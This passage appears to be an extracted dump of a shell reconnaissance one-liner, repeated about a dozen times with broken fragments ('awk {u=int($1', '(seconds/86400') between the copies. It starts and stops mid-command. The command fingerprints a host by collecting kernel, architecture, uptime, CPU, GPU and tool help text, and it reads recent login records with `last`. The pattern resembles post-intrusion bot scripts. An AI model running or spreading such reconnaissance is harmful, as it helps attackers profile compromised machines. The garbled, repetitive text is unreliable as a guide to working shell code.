's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc 